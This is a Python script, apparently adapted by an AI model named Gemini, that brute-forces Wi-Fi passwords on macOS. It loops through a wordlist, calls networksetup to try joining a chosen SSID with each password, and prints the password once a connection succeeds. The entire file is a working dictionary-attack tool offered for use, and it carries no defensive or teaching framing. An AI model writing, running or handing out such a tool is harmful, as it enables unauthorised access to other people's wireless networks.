#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import platform
import time
import subprocess

# By Brahim Jarrar ~
# GITHUB : https://github.com/BrahimJarrar/ ~
# CopyRight 2019 ~
# Modified for macOS by Gemini

RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

WIFI_INTERFACE = "en0"

def main(ssid, password, number):
    """
    Tries to connect to a Wi-Fi network using the specified password.
    """
    print(f"Trying password [{number}]: {password}")
    
    # Command to connect to the Wi-Fi network
    connect_command = [
        "networksetup",
        "-setairportnetwork",
        WIFI_INTERFACE,
        ssid,
        password
    ]
    
    try:
        # Execute the command to connect. Don't use check=True, we'll check stderr.
        result = subprocess.run(connect_command, capture_output=True, text=True, timeout=10)

        # On macOS, a wrong password might not cause a non-zero exit code,
        # but it will print an error to stderr.
        if result.stderr and ("Failed" in result.stderr or "incorrect" in result.stderr):
            print(RED, f'[{number}] Crack Failed using {password}')
            return

        # If no immediate error, verify the connection by checking the current network.
        # This is a secondary confirmation.
        time.sleep(2) # Give time for the connection to establish
        
        check_command = ["networksetup", "-getairportnetwork", WIFI_INTERFACE]
        check_result = subprocess.check_output(check_command, text=True)
        
        if f"Current Wi-Fi Network: {ssid}" in check_result:
            print(BOLD, GREEN, '[*] Crack success!', RESET)
            print(BOLD, GREEN, '[*] password is ' + password, RESET)
            exit()
        else:
            # This can happen if the command succeeded but association failed silently.
            print(RED, f'[{number}] Crack Failed using {password}')
            
    except subprocess.TimeoutExpired:
        print(RED, f'[{number}] Crack Failed using {password} (command timed out)')
    except Exception as e:
        print(f"An error occurred: {e}")

def pwd(ssid, file):
    """
    Reads passwords from a file and tries to connect.
    """
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            password = line.strip()
            if password:
                main(ssid, password, number)

def menu():
    """
    Parses command-line arguments and starts the cracking process.
    """
    if platform.system() != "Darwin":
        print(RED, "[-] This script is only for macOS.", RESET)
        sys.exit(1)

    parser = argparse.ArgumentParser(description='macOS Wi-Fi Password Cracker')
    parser.add_argument('-s', '--ssid', type=str, help='SSID of the Wi-Fi network')
    parser.add_argument('-w', '--wordlist', type=str, help='Path to the wordlist file')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0 (macOS)')

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...", RESET)
    time.sleep(1)

    if args.ssid and args.wordlist:
        ssid = args.ssid
        wordlist_file = args.wordlist
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        wordlist_file = input("[*] Passwords file: ")

    if os.path.exists(wordlist_file):
        os.system("clear")
        print(BLUE, "[~] Cracking...", RESET)
        pwd(ssid, wordlist_file)
    else:
        print(RED, f"[-] Wordlist file not found: {wordlist_file}", RESET)

if __name__ == "__main__":
    menu()